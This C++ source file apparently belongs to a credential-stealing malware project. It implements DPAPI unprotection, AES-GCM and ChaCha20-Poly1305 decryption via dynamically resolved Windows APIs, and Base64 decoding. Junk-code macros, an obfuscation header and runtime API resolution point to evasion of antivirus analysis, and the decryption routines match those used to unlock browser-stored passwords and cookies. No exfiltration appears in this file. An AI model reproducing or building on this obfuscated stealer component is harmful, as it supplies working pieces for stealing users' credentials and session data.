#include "Crypto.h"
#include "DynamicAPI.h"
#include "../core/Obfuscation.h"
#include "../core/Internal.h"
#include "../../DebugLog.h"
#include <vector>
#include <algorithm>
namespace Crypto {
    std::string DecryptDPAPI(const std::vector<BYTE>& data) {
        JUNK_CODE_SMALL
        if (data.empty()) { SLOG("[CRYPTO] DPAPI: empty input"); return ""; }
        if (!DynAPI::CryptUnprotData) { SLOG("[CRYPTO] DPAPI: CryptUnprotectData not resolved"); return ""; }
        DATA_BLOB in, out;
        in.pbData = const_cast<BYTE*>(data.data());
        in.cbData = (DWORD)data.size();
        if (DynAPI::CryptUnprotData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
            std::string result((char*)out.pbData, out.cbData);
            LocalFree(out.pbData);
            return result;
        }
        return "";
    }
    std::vector<BYTE> DecryptAES_GCM(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
        JUNK_CODE_SMALL
        SLOG("[CRYPTO] AES-GCM decrypt: key=%zuB iv=%zuB ct=%zuB", key.size(), iv.size(), ciphertext.size());
        if (!Internal::_BCryptOpenAlgorithmProvider) { SLOG("[CRYPTO] BCrypt not available"); return {}; }
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status;
        status = Internal::_BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (status != 0) return {};
        status = Internal::_BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        status = Internal::_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, const_cast<BYTE*>(key.data()), (ULONG)key.size(), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        memset(&authInfo, 0, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = const_cast<BYTE*>(iv.data());
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = const_cast<BYTE*>(tag.data());
        authInfo.cbTag = (ULONG)tag.size();
        if (!aad.empty()) {
            authInfo.pbAuthData = const_cast<BYTE*>(aad.data());
            authInfo.cbAuthData = (ULONG)aad.size();
        }
        DWORD decryptedSize = 0;
        std::vector<BYTE> decrypted(ciphertext.size());
        status = Internal::_BCryptDecrypt(hKey, const_cast<BYTE*>(ciphertext.data()), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decrypted.data(), (ULONG)decrypted.size(), &decryptedSize, 0);
        Internal::_BCryptDestroyKey(hKey);
        Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
        if (status != 0) return {};
        decrypted.resize(decryptedSize);
        return decrypted;
    }
    std::vector<BYTE> DecryptChaCha20Poly1305(const std::vector<BYTE>& key, const std::vector<BYTE>& iv, const std::vector<BYTE>& aad, const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag) {
        JUNK_CODE_SMALL
        if (!Internal::_BCryptOpenAlgorithmProvider) return {};
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        NTSTATUS status;
        status = Internal::_BCryptOpenAlgorithmProvider(&hAlg, L"CHACHA20_POLY1305", NULL, 0);
        if (status != 0) return {};
        status = Internal::_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, const_cast<BYTE*>(key.data()), (ULONG)key.size(), 0);
        if (status != 0) {
            Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        memset(&authInfo, 0, sizeof(authInfo));
        authInfo.cbSize = sizeof(authInfo);
        authInfo.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
        authInfo.pbNonce = const_cast<BYTE*>(iv.data());
        authInfo.cbNonce = (ULONG)iv.size();
        authInfo.pbTag = const_cast<BYTE*>(tag.data());
        authInfo.cbTag = (ULONG)tag.size();
        if (!aad.empty()) {
            authInfo.pbAuthData = const_cast<BYTE*>(aad.data());
            authInfo.cbAuthData = (ULONG)aad.size();
        }
        DWORD decryptedSize = 0;
        std::vector<BYTE> decrypted(ciphertext.size());
        status = Internal::_BCryptDecrypt(hKey, const_cast<BYTE*>(ciphertext.data()), (ULONG)ciphertext.size(), &authInfo, NULL, 0, decrypted.data(), (ULONG)decrypted.size(), &decryptedSize, 0);
        Internal::_BCryptDestroyKey(hKey);
        Internal::_BCryptCloseAlgorithmProvider(hAlg, 0);
        if (status != 0) return {};
        decrypted.resize(decryptedSize);
        return decrypted;
    }
    std::vector<BYTE> Base64Decode(const std::string& input) {
        JUNK_CODE_SMALL
        if (!DynAPI::CryptStrBinaryA) return {};
        DWORD outLen = 0;
        if (DynAPI::CryptStrBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
            std::vector<BYTE> result(outLen);
            if (DynAPI::CryptStrBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, result.data(), &outLen, NULL, NULL)) {
                return result;
            }
        }
        return {};
    }
}
